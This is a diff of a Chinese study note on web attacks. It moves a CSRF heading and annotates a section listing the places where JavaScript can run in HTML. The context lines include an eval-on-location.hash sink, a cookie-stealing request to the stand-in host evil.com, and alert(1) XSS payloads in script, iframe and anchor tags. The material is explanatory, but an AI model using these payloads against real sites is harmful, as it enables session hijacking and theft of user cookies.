@@ -20,8 +20,7 @@ eval( location.hash.substr(1) ); // 获取#符号后面的内容
 诱骗用户点击之后，用户所在的网站解析参数
 然后加载图片，发起get请求"http://www.evil.com/steal.php?c="+escape(document.cookie)
 ````
-### CSRF攻击
-### HTML内嵌脚本执行
+### HTML内嵌脚本执行 `能执行js的位置越多，意味着XSS发生的面越广，XSS漏洞出现的可能性越大`
 ````javascript
 js脚本除了执行在JS格式的文件里，还可以出现在HTML的很多标签中，如下：
 <script>alert(1)</script>
@@ -30,3 +29,4 @@ js脚本除了执行在JS格式的文件里，还可以出现在HTML的很多标
 <iframe src="javascript:alert(1)"></iframe>
 <a href="javascript:alert(1)">x</a>
 ````
+### CSRF攻击
